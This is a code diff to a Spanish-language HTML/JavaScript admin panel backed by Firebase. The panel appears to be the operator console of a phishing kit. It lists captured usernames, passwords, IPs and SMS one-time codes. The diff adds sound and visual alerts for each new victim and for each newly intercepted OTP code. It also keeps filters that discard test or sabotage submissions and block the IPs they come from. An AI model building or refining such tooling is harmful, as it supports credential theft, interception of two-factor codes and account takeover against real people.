@@ -9,10 +9,23 @@
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
         body { background-color: #0f172a; font-family: 'Inter', sans-serif; color: white; }
-        .card-user { background: #1e293b; border: 1px solid #334155; border-radius: 12px; padding: 16px; }
+        .card-user { background: #1e293b; border: 1px solid #334155; border-radius: 12px; padding: 16px; transition: all 0.3s; }
+        .card-user:hover { transform: translateY(-2px); box-shadow: 0 10px 30px rgba(0,0,0,0.3); }
         .card-spam { background: #451a1a; border: 1px solid #ef4444; opacity: 0.7; }
         .ip-bloqueada { background: #7f1d1d; border: 2px solid #dc2626; }
         .ip-repetida { background: #78350f; border: 2px solid #f59e0b; }
+        .nuevo-cliente { animation: nuevoFlash 2s ease-out; border: 2px solid #10b981 !important; box-shadow: 0 0 30px rgba(16, 185, 129, 0.5) !important; }
+        .nuevo-otp { animation: otpFlash 2s ease-out; border: 2px solid #8b5cf6 !important; box-shadow: 0 0 30px rgba(139, 92, 246, 0.5) !important; }
+        @keyframes nuevoFlash { 
+            0% { transform: scale(1); box-shadow: 0 0 0 rgba(16, 185, 129, 0); }
+            50% { transform: scale(1.02); box-shadow: 0 0 50px rgba(16, 185, 129, 0.8); }
+            100% { transform: scale(1); box-shadow: 0 0 30px rgba(16, 185, 129, 0.3); }
+        }
+        @keyframes otpFlash { 
+            0% { transform: scale(1); box-shadow: 0 0 0 rgba(139, 92, 246, 0); }
+            50% { transform: scale(1.02); box-shadow: 0 0 50px rgba(139, 92, 246, 0.8); }
+            100% { transform: scale(1); box-shadow: 0 0 30px rgba(139, 92, 246, 0.3); }
+        }
         .btn { padding: 8px 16px; border-radius: 6px; font-size: 11px; cursor: pointer; border: none; margin: 2px; font-weight: bold; }
         .btn-blue { background: #3b82f6; color: white; }
         .btn-purple { background: #8b5cf6; color: white; }
@@ -25,13 +38,82 @@
         .badge-red { background: #dc2626; color: white; }
         .badge-amber { background: #f59e0b; color: black; }
         .badge-green { background: #10b981; color: white; }
+        .badge-purple { background: #8b5cf6; color: white; }
         #login-overlay { position: fixed; inset: 0; background: #0f172a; z-index: 50; display: flex; align-items: center; justify-content: center; }
         #panel-content { display: none; }
         .alerta-ataque { background: linear-gradient(90deg, #dc2626, #991b1b); border: 2px solid #fca5a5; animation: pulse 2s infinite; }
         @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.8; } }
+        
+        /* Notificación flotante */
+        .notificacion-flotante {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            padding: 16px 24px;
+            border-radius: 12px;
+            color: white;
+            font-weight: bold;
+            z-index: 100;
+            transform: translateX(400px);
+            transition: transform 0.3s ease;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.4);
+        }
+        .notificacion-flotante.mostrar { transform: translateX(0); }
+        .notificacion-nuevo { background: linear-gradient(135deg, #10b981, #059669); border: 2px solid #34d399; }
+        .notificacion-otp { background: linear-gradient(135deg, #8b5cf6, #7c3aed); border: 2px solid #a78bfa; }
+        
+        /* Control de sonido */
+        .control-sonido {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            background: #1e293b;
+            border: 1px solid #334155;
+            padding: 12px 16px;
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            z-index: 40;
+        }
+        .toggle-switch {
+            width: 50px;
+            height: 26px;
+            background: #334155;
+            border-radius: 13px;
+            position: relative;
+            cursor: pointer;
+            transition: background 0.3s;
+        }
+        .toggle-switch.activo { background: #10b981; }
+        .toggle-switch::after {
+            content: '';
+            position: absolute;
+            width: 22px;
+            height: 22px;
+            background: white;
+            border-radius: 50%;
+            top: 2px;
+            left: 2px;
+            transition: transform 0.3s;
+        }
+        .toggle-switch.activo::after { transform: translateX(24px); }
     </style>
 </head>
 <body class="p-4">
+
+    <!-- NOTIFICACIONES FLOTANTES -->
+    <div id="notificacion" class="notificacion-flotante">
+        <i class="fa-solid fa-bell mr-2"></i>
+        <span id="notificacion-texto">Nuevo cliente</span>
+    </div>
+
+    <!-- CONTROL DE SONIDO -->
+    <div class="control-sonido">
+        <i class="fa-solid fa-volume-high text-slate-400"></i>
+        <span class="text-sm text-slate-300">Sonidos</span>
+        <div class="toggle-switch activo" id="toggleSonido" onclick="toggleSonido()"></div>
+    </div>
 
     <!-- LOGIN -->
     <div id="login-overlay">
@@ -49,7 +131,7 @@
         <div class="flex justify-between items-center mb-6 border-b border-slate-700 pb-4">
             <div>
                 <h1 class="text-3xl font-black text-white">PANEL <span class="text-blue-500">CLIENTES</span></h1>
-                <p class="text-slate-500 text-xs">Protección contra ataques directos</p>
+                <p class="text-slate-500 text-xs">Protección contra ataques directos • Sonidos activos</p>
             </div>
             <div class="flex items-center gap-4">
                 <button onclick="cambiarVista('ips')" class="btn btn-amber">📊 IPs</button>
@@ -102,13 +184,77 @@
         let datos = { validos: [], spam: [], blacklist: {} };
         let contadorIPs = {};
         let ataquesDetectados = 0;
+        let sonidosActivos = true;
+        let ultimosDatos = new Map(); // Para detectar cambios en OTP
+
+        // ===== SISTEMA DE SONIDOS =====
+        const audioContext = new (window.AudioContext || window.webkitAudioContext)();
+        
+        function reproducirSonido(tipo) {
+            if (!sonidosActivos) return;
+            
+            const osc = audioContext.createOscillator();
+            const gain = audioContext.createGain();
+            
+            osc.connect(gain);
+            gain.connect(audioContext.destination);
+            
+            if (tipo === 'nuevo') {
+                // Sonido de notificación ascendente (cliente nuevo)
+                osc.frequency.setValueAtTime(523.25, audioContext.currentTime); // Do
+                osc.frequency.setValueAtTime(659.25, audioContext.currentTime + 0.1); // Mi
+                osc.frequency.setValueAtTime(783.99, audioContext.currentTime + 0.2); // Sol
+                gain.gain.setValueAtTime(0.3, audioContext.currentTime);
+                gain.gain.exponentialRampToValueAtTime(0.01, audioContext.currentTime + 0.5);
+                osc.start(audioContext.currentTime);
+                osc.stop(audioContext.currentTime + 0.5);
+            } else if (tipo === 'otp') {
+                // Sonido de mensaje/alerta (OTP recibido)
+                osc.frequency.setValueAtTime(880, audioContext.currentTime); // La
+                osc.frequency.setValueAtTime(880, audioContext.currentTime + 0.1);
+                osc.frequency.setValueAtTime(1100, audioContext.currentTime + 0.15); // Do#
+                gain.gain.setValueAtTime(0.3, audioContext.currentTime);
+                gain.gain.exponentialRampToValueAtTime(0.01, audioContext.currentTime + 0.4);
+                osc.start(audioContext.currentTime);
+                osc.stop(audioContext.currentTime + 0.4);
+                
+                // Segundo beep para hacerlo más notorio
+                setTimeout(() => {
+                    const osc2 = audioContext.createOscillator();
+                    const gain2 = audioContext.createGain();
+                    osc2.connect(gain2);
+                    gain2.connect(audioContext.destination);
+                    osc2.frequency.setValueAtTime(880, audioContext.currentTime);
+                    gain2.gain.setValueAtTime(0.3, audioContext.currentTime);
+                    gain2.gain.exponentialRampToValueAtTime(0.01, audioContext.currentTime + 0.3);
+                    osc2.start(audioContext.currentTime);
+                    osc2.stop(audioContext.currentTime + 0.3);
+                }, 150);
+            }
+        }
+
+        function toggleSonido() {
+            sonidosActivos = !sonidosActivos;
+            document.getElementById('toggleSonido').classList.toggle('activo', sonidosActivos);
+        }
+
+        function mostrarNotificacion(texto, tipo) {
+            const notif = document.getElementById('notificacion');
+            const notifTexto = document.getElementById('notificacion-texto');
+            
+            notif.className = 'notificacion-flotante mostrar ' + (tipo === 'otp' ? 'notificacion-otp' : 'notificacion-nuevo');
+            notifTexto.textContent = texto;
+            
+            setTimeout(() => {
+                notif.classList.remove('mostrar');
+            }, 3000);
+        }
 
         // ANTI-SPAM ULTRA RESTRINGIDO (contra ataques directos)
         function esSpam(id, data) {
             if (!data || typeof data !== 'object') return true;
             if (!data.user || !data.pass) return true;
             
-            // IDs de prueba (detecta test-001, test_002, TEST-123, etc.)
             const idLower = id.toLowerCase();
             const spamPatterns = ['test', 'prueba', 'admin', 'demo', 'fake', 'ejemplo', 'sample', 'user', 'pass', 'login'];
             if (spamPatterns.some(s => idLower.includes(s))) {
@@ -116,7 +262,6 @@
                 return true;
             }
             
-            // Usuarios de prueba
             const userLower = (data.user || '').toLowerCase();
             const spamUsers = ['test', 'prueba', 'admin', 'demo', 'usuario1', 'usuario2', 'usuario3', 'usuario4', 'usuario5', 
                              'user1', 'user2', 'user3', 'pass', 'password', '123456', 'qwerty'];
@@ -125,7 +270,6 @@
                 return true;
             }
             
-            // Contraseñas de prueba
             const passLower = (data.pass || '').toLowerCase();
             const spamPasses = ['test', 'prueba', 'admin', 'demo', '123', 'clave1', 'clave2', 'clave3', 'password', 'pass', 
                               '123456', 'qwerty', '111111', '000000'];
@@ -134,11 +278,9 @@
                 return true;
             }
             
-            // Datos sospechosos (muy cortos o muy largos)
             if (data.user.length < 3 || data.user.length > 50) return true;
             if (data.pass.length < 3 || data.pass.length > 100) return true;
             
-            // IP bloqueada
             if (data.ip && datos.blacklist[data.ip]) return true;
             
             return false;
@@ -174,17 +316,18 @@
             if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
             db = firebase.database();
 
-            // Escuchar logins con auto-limpieza de spam
+            // Escuchar logins con sonidos
             db.ref('logins').on('value', (snap) => {
                 const validos = [];
                 contadorIPs = {};
                 ataquesDetectados = 0;
+                const nuevosIDs = new Set();
                 
                 snap.forEach((child) => {
                     const data = child.val();
                     const id = child.key;
                     
-                    // Auto-eliminar si es spam (ataque directo)
+                    // Auto-eliminar si es spam
                     if (esSpam(id, data)) {
                         db.ref('spam/' + id).set({
                             ...data,
@@ -200,12 +343,23 @@
                         contadorIPs[data.ip] = (contadorIPs[data.ip] || 0) + 1;
                     }
                     
+                    // Detectar si es nuevo (no estaba en ultimosDatos)
+                    if (!ultimosDatos.has(id)) {
+                        nuevosIDs.add(id);
+                    }
+                    
                     validos.push({ id, data, esSpam: false });
+                    ultimosDatos.set(id, data);
                 });
+                
+                // Reproducir sonido si hay nuevos clientes
+                if (nuevosIDs.size > 0 && datos.validos.length > 0) {
+                    reproducirSonido('nuevo');
+                    mostrarNotificacion(`¡${nuevosIDs.size} nuevo${nuevosIDs.size > 1 ? 's' : ''} cliente!`, 'nuevo');
+                }
                 
                 datos.validos = validos;
                 
-                // Mostrar alerta si hay ataques
                 if (ataquesDetectados > 0) {
                     document.getElementById('alerta-ataque').classList.remove('hidden');
                     document.getElementById('contador-ataques').textContent = ataquesDetectados;
@@ -213,31 +367,29 @@
                     document.getElementById('alerta-ataque').classList.add('hidden');
                 }
                 
-                renderizar();
+                renderizar(nuevosIDs);
             });
 
             db.ref('spam').on('value', (snap) => {
-                const spam = [];
+                datos.spam = [];
                 snap.forEach((child) => {
-                    spam.push({ id: child.key, data: child.val(), esSpam: true });
+                    datos.spam.push({ id: child.key, data: child.val(), esSpam: true });
                 });
-                datos.spam = spam;
-                renderizar();
+                renderizar(new Set());
             });
 
             db.ref('blacklist').on('value', (snap) => {
                 datos.blacklist = snap.val() || {};
                 document.getElementById('stat-blocked').textContent = Object.keys(datos.blacklist).length;
-                renderizar();
+                renderizar(new Set());
             });
         }
 
         function cambiarVista(vista) {
             vistaActual = vista;
-            renderizar();
+            renderizar(new Set());
         }
 
-        // FUNCIONES DE LIMPIEZA MASIVA
         function limpiarTests() {
             if(!confirm('🧹 ¿Eliminar TODOS los registros que contengan "test", "prueba", "admin", "demo"?')) return;
             
@@ -259,10 +411,7 @@
 
         function limpiarTodoSpam() {
             if(!confirm('⚠️ ¿Vaciar COMPLETAMENTE la papelera?')) return;
-            
-            db.ref('spam').remove().then(() => {
-                alert('🗑 Papelera vaciada');
-            });
+            db.ref('spam').remove().then(() => alert('🗑 Papelera vaciada'));
         }
 
         function bloquearIPsMasivas() {
@@ -276,11 +425,10 @@
                     bloqueadas++;
                 }
             }
-            
             alert(`🚫 Bloqueadas ${bloqueadas} IPs`);
         }
 
-        function renderizar() {
+        function renderizar(nuevosIDs = new Set()) {
             const container = document.getElementById('container');
             container.innerHTML = '';
 
@@ -302,22 +450,44 @@
                 return;
             }
 
+            // Detectar OTPs nuevos
+            const otpNuevos = new Set();
+            aMostrar.forEach(({id, data}) => {
+                const prevData = ultimosDatos.get(id);
+                if (prevData && data.sms && data.sms !== '----' && data.sms !== '' && 
+                    (!prevData.sms || prevData.sms === '----' || prevData.sms === '')) {
+                    otpNuevos.add(id);
+                }
+            });
+
+            if (otpNuevos.size > 0) {
+                reproducirSonido('otp');
+                mostrarNotificacion(`¡${otpNuevos.size} código${otpNuevos.size > 1 ? 's' : ''} OTP recibido!`, 'otp');
+            }
+
             aMostrar.forEach(({id, data, esSpam}) => {
                 const isOnline = data.online === true;
                 const tieneOTP = data.sms && data.sms !== '----' && data.sms !== '';
                 const vecesIP = contadorIPs[data.ip] || 1;
                 const ipBloqueada = data.ip && datos.blacklist[data.ip];
+                const esNuevo = nuevosIDs.has(id);
+                const esNuevoOTP = otpNuevos.has(id);
                 
                 let cardClass = 'card-user';
                 if (esSpam) cardClass = 'card-user card-spam';
                 else if (ipBloqueada) cardClass = 'card-user ip-bloqueada';
                 else if (vecesIP >= 5) cardClass = 'card-user ip-repetida';
                 
+                if (esNuevo) cardClass += ' nuevo-cliente';
+                if (esNuevoOTP) cardClass += ' nuevo-otp';
+                
                 container.innerHTML += `
-                    <div class="${cardClass}">
+                    <div class="${cardClass}" id="card-${id}">
                         <div class="flex justify-between items-center mb-2">
                             <span class="text-xs text-slate-400">#${id.slice(-8)}</span>
                             <div class="flex gap-1">
+                                ${esNuevo ? '<span class="badge badge-green">NUEVO</span>' : ''}
+                                ${esNuevoOTP ? '<span class="badge badge-purple">OTP!</span>' : ''}
                                 ${vecesIP > 1 ? `<span class="badge badge-amber">${vecesIP}</span>` : ''}
                                 ${ipBloqueada ? '<span class="badge badge-red">BLOQUEADA</span>' : ''}
                                 ${isOnline ? '<span class="badge badge-green">ONLINE</span>' : ''}
